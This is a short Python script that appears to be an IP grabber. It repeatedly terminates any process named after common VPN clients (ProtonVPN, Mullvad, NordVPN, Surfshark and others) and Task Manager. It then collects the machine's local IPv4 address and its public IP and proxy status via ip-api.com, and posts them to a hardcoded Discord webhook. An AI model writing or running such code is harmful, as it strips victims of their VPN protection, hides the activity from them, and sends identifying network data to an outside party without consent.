import psutil
import requests
import socket

WEBHOOK_URL = 'https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn'

KEYWORDS = [
    'Proton', 'ProtonVPN', 'Proton VPN', 'ProtonVPN Service', 'mullvad',
    'nord', 'openvpn', 'express', 'surfshark', 'cyberghost', 'windscribe',
    'pia', 'hotspot', 'tunnelbear', 'Task Manager'
]

def kill_processes_by_keywords(keywords):
    keywords_lower = [k.lower() for k in keywords]
    while True:
        found = False
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                pname = proc.info['name']
                if pname and any(k in pname.lower() for k in keywords_lower):
                    found = True
                    proc.terminate()
                    try:
                        proc.wait(timeout=1)
                    except psutil.TimeoutExpired:
                        proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        if not found:
            break

kill_processes_by_keywords(KEYWORDS)

TRUE_IPV4 = None
for interface_addresses in psutil.net_if_addrs().values():
    for address in interface_addresses:
        if address.family == socket.AF_INET:
            if not address.address.startswith('127.'):
                TRUE_IPV4 = address.address
                break
    if TRUE_IPV4:
        break

API_IPV4 = None
PROXY = None
try:
    r = requests.get("http://ip-api.com/json/", timeout=8)
    data = r.json()
    API_IPV4 = data.get("query")
    PROXY = data.get("proxy", False)
except Exception:
    API_IPV4 = None
    PROXY = False

content = f"{TRUE_IPV4 or 'None'}\n{API_IPV4 or 'None'} {'true' if PROXY else 'false'}"
requests.post(WEBHOOK_URL, json={'content': content})
